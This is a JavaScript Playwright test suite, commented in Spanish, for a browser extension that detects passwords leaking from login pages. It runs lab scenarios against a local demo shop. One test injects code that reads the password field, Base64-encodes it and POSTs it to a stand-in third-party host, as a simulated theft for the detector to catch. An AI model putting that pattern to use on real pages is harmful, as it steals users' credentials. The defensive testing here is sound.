// Pruebas de extremo a extremo y grabación de la demo (docs/specs/laboratorio.md, sección 4).
// Requiere la extensión compilada en dist/ (npm run test:e2e la compila antes).
// CREDFLOW_CHROMIUM_PATH permite usar un Chromium ya instalado en lugar del que descarga Playwright.
import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { chromium } from "playwright";
import { describeArrival, LAB_PASSWORD, PORT, startLab } from "../../lab/demo/server.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const extensionPath = path.join(root, "dist");
const evidence = path.join(root, "test-results", "demo");
const PASSWORD = "Prueba#2026";
const TIENDA = `http://localhost:${PORT}`;

const lab = await startLab();
await mkdir(evidence, { recursive: true });
const context = await chromium.launchPersistentContext(
  await mkdtemp(path.join(os.tmpdir(), "credflow-e2e-")),
  {
    channel: "chromium",
    ...(process.env.CREDFLOW_CHROMIUM_PATH
      ? { executablePath: process.env.CREDFLOW_CHROMIUM_PATH }
      : {}),
    headless: true,
    viewport: { width: 900, height: 640 },
    args: [
      `--disable-extensions-except=${extensionPath}`,
      `--load-extension=${extensionPath}`,
      // Nombre de host que no es de bucle local, para el escenario de canal sin cifrar.
      "--host-resolver-rules=MAP tienda.lab 127.0.0.1",
    ],
  }
);

let [worker] = context.serviceWorkers();
if (!worker) worker = await context.waitForEvent("serviceworker");
const extensionId = new URL(worker.url()).host;

/** Service Worker actual de la extensión: tras un reinicio, el objeto anterior ya no sirve. */
async function liveWorker() {
  const prefix = `chrome-extension://${extensionId}/`;
  const current = context.serviceWorkers().find((w) => w.url().startsWith(prefix));
  return current ?? context.waitForEvent("serviceworker", { timeout: 15_000 });
}

async function tabIdOf(url) {
  return (await liveWorker()).evaluate(async (u) => {
    const tabs = await chrome.tabs.query({});
    return tabs.find((t) => t.url === u)?.id ?? null;
  }, url);
}

/** Abre un escenario, escribe como un usuario real y devuelve la página y su pestaña. */
let run = 0;
/** URL única por ejecución, para identificar sin ambigüedad la pestaña de cada prueba. */
function unique(url) {
  run += 1;
  return `${url}&run=${run}`;
}

async function runScenario(url, { submit = "click", beforeTyping } = {}) {
  const page = await context.newPage();
  await page.goto(unique(url));
  const tabId = await tabIdOf(page.url());
  if (beforeTyping) await beforeTyping(page);
  await page.click('input[name="usuario"]');
  await page.keyboard.type("ana.prueba");
  await page.click('input[type="password"]');
  await page.keyboard.type(PASSWORD, { delay: 20 });
  if (submit === "click") await page.click('button[type="submit"]');
  else await page.keyboard.press("Enter"); // envío inmediato, sin esperar los 300 ms
  await page.waitForTimeout(1200);
  return { page, tabId };
}

async function popupFor(tabId, name) {
  const popup = await context.newPage();
  await popup.setViewportSize({ width: 380, height: 360 });
  await popup.goto(`chrome-extension://${extensionId}/src/popup/popup.html#tabId=${tabId}`);
  await popup.waitForTimeout(300);
  const rows = await popup.$$eval(".event", (items) =>
    items.map((li) => ({
      verdict: li.querySelector(".verdict")?.textContent ?? "",
      severity: li.querySelector(".severity")?.textContent ?? "",
      meta: [...li.querySelectorAll(".meta")].map((m) => m.textContent).join(" | "),
    }))
  );
  const status = await popup.textContent("#status");
  await popup.screenshot({ path: path.join(evidence, `${name}-popup.png`), fullPage: true });
  await popup.close();
  return { rows, status };
}

async function badgeOf(tabId) {
  return (await liveWorker()).evaluate(
    async (id) => ({
      text: await chrome.action.getBadgeText({ tabId: id }),
      color: await chrome.action.getBadgeBackgroundColor({ tabId: id }),
    }),
    tabId
  );
}

const results = [];
async function check(name, fn) {
  try {
    await fn();
    results.push([name, "OK"]);
  } catch (error) {
    results.push([name, `FALLÓ: ${error.message.split("\n")[0]}`]);
  }
}

const RED = [217, 48, 37, 255];
const AMBER = [227, 116, 0, 255];
const verdicts = (rows) => rows.map((r) => r.verdict);

await check("Robo en Base64 → tercero, crítica (CA-13, CA-P3, CA-U6, CA-L2)", async () => {
  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=robo`);
  await page.screenshot({ path: path.join(evidence, "robo-pagina.png") });
  const { rows } = await popupFor(tabId, "robo");
  assert.deepEqual(await badgeOf(tabId), { text: "1", color: RED });
  assert.ok(verdicts(rows).includes("Enviada a un tercero no autorizado"));
  assert.ok(
    rows.some((r) => r.meta.includes(`http://127.0.0.1:${PORT}`) && r.meta.includes("Contraseña"))
  );
  assert.ok(!JSON.stringify(rows).includes(PASSWORD), "el popup no debe mostrar la contraseña");
  // CA-I3: el popup indica qué script envió la contraseña.
  assert.ok(
    rows.some((r) => r.meta.includes(`Script: analytics.js (${TIENDA})`)),
    JSON.stringify(rows)
  );
  await page.close();
});

await check(
  "Robo dentro de un Blob → no inspeccionable y evidencia de página (CA-17, CA-I6, CA-L2)",
  async () => {
    const { page, tabId } = await runScenario(`${TIENDA}/?escenario=robo-blob`);
    const { rows } = await popupFor(tabId, "robo-blob");
    assert.ok(
      verdicts(rows).includes("Envío no inspeccionable a un tercero"),
      JSON.stringify(rows)
    );
    // El interceptor lee el Blob y confirma que contiene la contraseña.
    assert.ok(
      rows.some(
        (r) =>
          r.verdict === "Enviada a un tercero no autorizado" &&
          r.meta.includes("Detectado en la página (Blob)")
      ),
      JSON.stringify(rows)
    );
    assert.deepEqual(await badgeOf(tabId), { text: "2", color: RED });
    await page.close();
  }
);

await check("Contraseña en un encabezado HTTP → evidencia de página (CA-I4, CA-L2)", async () => {
  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=robo-encabezado`);
  const { rows } = await popupFor(tabId, "robo-encabezado");
  assert.ok(
    rows.some(
      (r) =>
        r.verdict === "Enviada a un tercero no autorizado" &&
        r.meta.includes("Detectado en la página (encabezado)") &&
        r.meta.includes("Script: analytics.js")
    ),
    JSON.stringify(rows)
  );
  assert.deepEqual(await badgeOf(tabId), { text: "1", color: RED });
  await page.close();
});

await check("Contraseña por WebSocket → evidencia de página (CA-I5, CA-L2)", async () => {
  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=robo-websocket`);
  const { rows } = await popupFor(tabId, "robo-websocket");
  assert.ok(
    rows.some(
      (r) =>
        r.verdict === "Enviada a un tercero no autorizado" &&
        r.meta.includes("Detectado en la página (WebSocket)")
    ),
    JSON.stringify(rows)
  );
  assert.deepEqual(await badgeOf(tabId), { text: "1", color: RED });
  await page.close();
});

await check("La página sigue funcionando con el interceptor (CA-I7)", async () => {
  const page = await context.newPage();
  await page.goto(unique(`${TIENDA}/?escenario=limpio`));
  await page.click('input[type="password"]');
  await page.keyboard.type(PASSWORD, { delay: 20 });
  const outcome = await page.evaluate(async (metrics) => {
    const fetchStatus = (
      await fetch(`${metrics}/recibir/js`, {
        method: "POST",
        headers: { "X-Token": "abc" },
        body: new Blob(["hola"]),
      })
    ).status;
    const xhrStatus = await new Promise((resolve) => {
      const xhr = new XMLHttpRequest();
      xhr.open("POST", `${metrics}/recibir/js`);
      xhr.setRequestHeader("Content-Type", "text/plain");
      xhr.onloadend = () => resolve(xhr.status);
      xhr.send("hola");
    });
    const beacon = navigator.sendBeacon(`${metrics}/recibir/js`, new Blob(["hola"]));
    const socket = await new Promise((resolve) => {
      const ws = new WebSocket(metrics.replace("http", "ws") + "/ws");
      ws.onopen = () => {
        ws.send("hola");
        ws.send(new Uint8Array([104, 111, 108, 97]));
        ws.close();
        resolve("abierto");
      };
      ws.onerror = () => resolve("error");
    });
    return { fetchStatus, xhrStatus, beacon, socket };
  }, `http://127.0.0.1:${PORT}`);
  assert.deepEqual(outcome, { fetchStatus: 204, xhrStatus: 204, beacon: true, socket: "abierto" });
  await page.close();
});

await check("Contraseña en la URL → credencial en URL, alta (CA-L2)", async () => {
  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=url`);
  const { rows } = await popupFor(tabId, "url");
  assert.deepEqual(await badgeOf(tabId), { text: "1", color: AMBER });
  assert.ok(verdicts(rows).includes("Credencial en la URL"));
  await page.close();
});

await check("Escenario limpio → mismo sitio, sin alerta (CA-L2)", async () => {
  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=limpio`);
  const { rows } = await popupFor(tabId, "limpio");
  assert.equal((await badgeOf(tabId)).text, "");
  assert.deepEqual(verdicts(rows), [
    "Contraseña ingresada en este sitio",
    "Enviada al mismo sitio",
  ]);
  await page.close();
});

await check("Canal sin cifrar con un host que no es de bucle local (CA-20)", async () => {
  const { page, tabId } = await runScenario(`http://tienda.lab:${PORT}/?escenario=limpio`);
  const { rows } = await popupFor(tabId, "inseguro");
  assert.equal((await badgeOf(tabId)).text, "1");
  assert.ok(verdicts(rows).includes("Enviada por un canal sin cifrar"));
  await page.close();
});

await check("Envío inmediato con Enter, sin esperar 300 ms (CA-P6)", async () => {
  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=robo`, { submit: "enter" });
  const { rows } = await popupFor(tabId, "robo-enter");
  assert.ok(verdicts(rows).includes("Enviada a un tercero no autorizado"));
  await page.close();
});

await check("Campo de contraseña agregado después de cargar (CA-P5)", async () => {
  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=robo`, {
    beforeTyping: (p) =>
      p.evaluate(() => {
        const old = document.querySelector('input[type="password"]');
        const nuevo = document.createElement("input");
        nuevo.type = "password";
        nuevo.name = "clave";
        old.replaceWith(nuevo);
      }),
  });
  const { rows } = await popupFor(tabId, "campo-dinamico");
  assert.ok(verdicts(rows).includes("Enviada a un tercero no autorizado"));
  await page.close();
});

await check("Un evento input sintético no registra huellas (CA-P4)", async () => {
  const page = await context.newPage();
  await page.goto(unique(`${TIENDA}/?escenario=robo`));
  await page.evaluate((pwd) => {
    const field = document.querySelector('input[type="password"]');
    field.value = pwd;
    field.dispatchEvent(new Event("input", { bubbles: true }));
    document.getElementById("login").requestSubmit();
  }, PASSWORD);
  await page.waitForTimeout(1200);
  const tabId = await tabIdOf(page.url());
  const { rows, status } = await popupFor(tabId, "sintetico");
  assert.equal(rows.length, 0, JSON.stringify(rows));
  assert.equal(status, "Sin flujos sensibles en esta pestaña");
  await page.close();
});

await check("Escribir solo en un campo de texto normal no genera eventos (CA-P7)", async () => {
  const page = await context.newPage();
  await page.goto(unique(`${TIENDA}/?escenario=robo`));
  await page.click('input[name="usuario"]');
  await page.keyboard.type("usuario.de.prueba");
  await page.click('button[type="submit"]');
  await page.waitForTimeout(1200);
  const { rows } = await popupFor(await tabIdOf(page.url()), "solo-usuario");
  assert.equal(rows.length, 0, JSON.stringify(rows));
  await page.close();
});

await check("Los eventos sobreviven a un reinicio del Service Worker (CA-U8)", async () => {
  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=robo`);
  const cdp = await context.newCDPSession(page);
  await cdp.send("ServiceWorker.enable");
  await cdp.send("ServiceWorker.stopAllWorkers");
  await page.waitForTimeout(1500);
  const { rows } = await popupFor(tabId, "tras-reinicio");
  assert.ok(verdicts(rows).includes("Enviada a un tercero no autorizado"), JSON.stringify(rows));
  await page.close();
});

await check("El ícono sigue en rojo tras navegar a otra página (CA-U9)", async () => {
  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=robo-navega`);
  await page.waitForURL("**/bienvenida.html");
  await page.waitForTimeout(800);
  await page.screenshot({ path: path.join(evidence, "robo-navega-pagina.png") });
  assert.deepEqual(await badgeOf(tabId), { text: "1", color: RED });
  const { rows } = await popupFor(tabId, "robo-navega");
  assert.ok(verdicts(rows).includes("Enviada a un tercero no autorizado"));
  await page.close();
});

await check("Envío por JavaScript más de 30 s después de escribir (CA-P8)", async () => {
  const page = await context.newPage();
  await page.goto(unique(`${TIENDA}/?escenario=limpio`));
  const tabId = await tabIdOf(page.url());
  await page.click('input[type="password"]');
  await page.keyboard.type(PASSWORD, { delay: 20 });
  await page.click("h1"); // pierde el foco: primer envío de huellas
  await page.waitForTimeout(33_000); // las huellas caducan a los 30 s
  await page.click("h1"); // clic de confianza: refresco de huellas
  await page.evaluate((metrics) => {
    const clave = document.querySelector('input[type="password"]').value;
    return fetch(`${metrics}/recibir/js`, {
      method: "POST",
      body: JSON.stringify({ c: btoa(clave) }),
    });
  }, `http://127.0.0.1:${PORT}`);
  await page.waitForTimeout(1000);
  const { rows } = await popupFor(tabId, "envio-tardio");
  assert.ok(verdicts(rows).includes("Enviada a un tercero no autorizado"), JSON.stringify(rows));
  await page.close();
});

await check("Contraseña cifrada por la página → informativo, sin alerta (CA-U13)", async () => {
  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=cifrado`);
  const { rows } = await popupFor(tabId, "cifrado");
  assert.equal((await badgeOf(tabId)).text, "");
  assert.ok(verdicts(rows).includes("Contraseña ingresada en este sitio"), JSON.stringify(rows));
  assert.ok(
    verdicts(rows).includes("La página cifra la contraseña antes de enviarla"),
    JSON.stringify(rows)
  );
  assert.ok(
    !verdicts(rows).includes("Enviada al mismo sitio"),
    "la contraseña no debe verse en claro"
  );
  await page.close();
});

await check("Contraseña cifrada enviada a un tercero → alta (CA-U14)", async () => {
  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=cifrado-robo`);
  const { rows } = await popupFor(tabId, "cifrado-robo");
  assert.deepEqual(await badgeOf(tabId), { text: "1", color: AMBER });
  assert.ok(
    verdicts(rows).includes("Contraseña cifrada enviada a un tercero"),
    JSON.stringify(rows)
  );
  await page.close();
});

await check("Confiar en un destino y quitarlo desde el popup (CA-U17)", async () => {
  const trusted = async () => {
    const first = await runScenario(`${TIENDA}/?escenario=robo`);
    const popup = await context.newPage();
    await popup.goto(`chrome-extension://${extensionId}/src/popup/popup.html#tabId=${first.tabId}`);
    const button = popup.locator(".actions button").first();
    assert.equal(await button.textContent(), "Confiar en 127.0.0.1");
    await button.click();
    assert.equal(await button.textContent(), "¿Confirmar?");
    await button.click();
    await popup.waitForTimeout(400);
    await popup.click("#trusted summary");
    assert.deepEqual(
      await popup.$$eval("#trusted-list li span", (s) => s.map((x) => x.textContent)),
      ["127.0.0.1"]
    );
    await popup.screenshot({ path: path.join(evidence, "confiar-popup.png"), fullPage: true });
    await popup.close();
    await first.page.close();
  };
  await trusted();
  const again = await runScenario(`${TIENDA}/?escenario=robo`);
  const { rows } = await popupFor(again.tabId, "confiado");
  assert.ok(verdicts(rows).includes("Enviada a un proveedor autorizado"), JSON.stringify(rows));
  assert.ok(!verdicts(rows).includes("Enviada a un tercero no autorizado"), JSON.stringify(rows));
  assert.equal((await badgeOf(again.tabId)).text, "");
  await again.page.close();

  const popup = await context.newPage();
  await popup.goto(`chrome-extension://${extensionId}/src/popup/popup.html#tabId=0`);
  await popup.click("#trusted summary");
  await popup.getByRole("button", { name: "Quitar" }).click();
  await popup.waitForTimeout(400);
  assert.equal(await popup.$$eval("#trusted-list li", (l) => l.length), 0);
  await popup.close();
  const after = await runScenario(`${TIENDA}/?escenario=robo`);
  const { rows: rowsAfter } = await popupFor(after.tabId, "tras-quitar");
  assert.ok(
    verdicts(rowsAfter).includes("Enviada a un tercero no autorizado"),
    JSON.stringify(rowsAfter)
  );
  await after.page.close();
});

await check(
  "Grafo de flujos con flecha roja al atacante y verde a la tienda (CA-U21)",
  async () => {
    const { page, tabId } = await runScenario(`${TIENDA}/?escenario=robo`);
    const popup = await context.newPage();
    await popup.setViewportSize({ width: 380, height: 600 });
    await popup.goto(`chrome-extension://${extensionId}/src/popup/popup.html#tabId=${tabId}`);
    await popup.waitForSelector("#graph svg");
    const graph = await popup.$eval("#graph svg", (svg) => ({
      aria: svg.getAttribute("aria-label"),
      edges: [...svg.querySelectorAll("line.edge")].map((l) => l.getAttribute("class")),
      labels: [...svg.querySelectorAll("text.label")].map((t) => t.textContent),
    }));
    assert.equal(
      graph.aria,
      "Flujos desde localhost: 127.0.0.1, crítica, 1 envío; localhost, normal, 1 envío"
    );
    assert.deepEqual(graph.edges, ["edge critical", "edge ok"]);
    assert.deepEqual(graph.labels, ["✗ 127.0.0.1", "✓ localhost"]);
    await popup.screenshot({ path: path.join(evidence, "grafo-popup.png"), fullPage: true });
    await popup.close();
    await page.close();
  }
);

await check("Historial: exportar JSON verificado y borrar (CA-A10)", async () => {
  const { page } = await runScenario(`${TIENDA}/?escenario=robo`);
  const popup = await context.newPage();
  await popup.goto(`chrome-extension://${extensionId}/src/popup/popup.html#tabId=0`);
  await popup.click("#history summary");
  await popup.waitForFunction(() =>
    /eventos? guardados?/.test(document.getElementById("history-status")?.textContent ?? "")
  );
  const [download] = await Promise.all([
    popup.waitForEvent("download"),
    popup.click("#history-export"),
  ]);
  assert.match(download.suggestedFilename(), /^credflow-auditoria-\d{8}-\d{6}\.json$/);
  const file = JSON.parse(await readFile(await download.path(), "utf8"));
  assert.equal(file.format, "credflow-audit/1");
  assert.equal(file.verification.valid, true, JSON.stringify(file.verification));
  assert.ok(file.records.some((r) => r.entry.verdict === "third_party"));
  const text = JSON.stringify(file);
  assert.ok(!text.includes(PASSWORD) && !text.includes(btoa(PASSWORD)), "sin la contraseña");
  assert.ok(!text.includes("tabId"));
  await popup.screenshot({ path: path.join(evidence, "historial-popup.png"), fullPage: true });
  await popup.click("#history-clear");
  assert.equal(await popup.textContent("#history-clear"), "¿Confirmar?");
  await popup.click("#history-clear");
  await popup.waitForFunction(
    () => document.getElementById("history-status")?.textContent === "Sin eventos guardados."
  );
  await popup.close();
  await page.close();
});

await check("La vista del atacante solo muestra la contraseña ficticia (CA-L5)", async () => {
  const b64 = (text) => Buffer.from(text).toString("base64");
  const arrival = (host, body, search = "") =>
    describeArrival({ host, pathname: "/recibir/beacon", search, body });
  const fake = arrival(`127.0.0.1:${PORT}`, `c=${b64(LAB_PASSWORD)}`);
  assert.equal(fake.stolen, true);
  assert.match(fake.summary, /Prueba#2026 \(en Base64\)/);
  assert.match(arrival(`localhost:${PORT}`, "", "?clave=Prueba%232026").summary, /en la URL/);
  for (const real of ["MiClaveReal!99", "contraseña-de-verdad"]) {
    for (const body of [real, `c=${b64(real)}`, `clave=${encodeURIComponent(real)}`]) {
      const result = arrival(`127.0.0.1:${PORT}`, body);
      assert.equal(result.stolen, false);
      assert.ok(
        !result.summary.includes(real),
        "no debe mostrar una contraseña que no sea la ficticia"
      );
    }
  }
});

await context.close();
await lab.close();

let failed = 0;
for (const [name, outcome] of results) {
  if (outcome !== "OK") failed += 1;
  console.log(`${outcome === "OK" ? "✓" : "✗"} ${name}${outcome === "OK" ? "" : ` — ${outcome}`}`);
}
console.log(
  `\n${results.length - failed} de ${results.length} pruebas E2E pasaron. Capturas en test-results/demo/`
);
process.exit(failed === 0 ? 0 : 1);
